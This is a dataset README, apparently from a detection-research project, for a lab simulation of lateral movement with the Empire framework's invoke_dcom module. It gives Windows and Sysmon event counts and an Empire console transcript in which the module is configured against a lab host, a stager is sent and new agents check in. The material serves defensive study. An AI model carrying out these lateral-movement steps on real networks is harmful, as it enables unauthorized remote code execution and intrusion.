# Empire Ivoke DCOM

Invoke commands on remote hosts via MMC20.Application COM object over DCOM.

## Technique(s) ID

T1175

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_dcom.tar.gz](./empire_invoke_dcom.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18211052

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |            1042 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               6 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             302 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             127 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              35 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              11 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |            1120 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             518 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             414 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             286 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              31 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              20 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              20 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               8 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               7 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File creation time changed (rule: FileCreateTime)      |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             880 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               1 |

## Empire Activity

```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_dcom
(Empire: powershell/lateral_movement/invoke_dcom) > info

              Name: Invoke-DCOM
            Module: powershell/lateral_movement/invoke_dcom
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @rvrsh3ll

Description:
  Invoke commands on remote hosts via MMC20.Application COM object over DCOM.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     True                                  Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                     separated.                              
  Proxy        False       default                   Proxy to use for request (default, none,
                                                     or other).                              
  ProxyCreds   False       default                   Proxy credentials                       
                                                     ([domain\]username:password) to use for 
                                                     request (default, none, or other).      
  UserAgent    False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      
  Method       True        ShellWindows              COM method to use. MMC20.Application,She
                                                     llWindows,ShellBrowserWindow,ExcelDDE   
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_dcom) > set Listener https
(Empire: powershell/lateral_movement/invoke_dcom) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_dcom) > execute
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 3
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_dcom
(Empire: powershell/lateral_movement/invoke_dcom) > Completed


[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent YR1FKZ6A checked in
[+] Initial agent YR1FKZ6A from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to YR1FKZ6A at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_dcom) > agents 

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:11:59  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:11:59  https           
 EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:11:58  https           

 V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:11:58  https           
 XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:11:58  https           
 EXBNZYTS ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         6728   5/0.0    2019-05-18 21:12:02  https           

 YR1FKZ6A ps 172.18.39.105   IT001             SHIRE\pgustavo          powershell         5228   5/0.0    2019-05-18 21:12:01  https           

(Empire: agents) >
```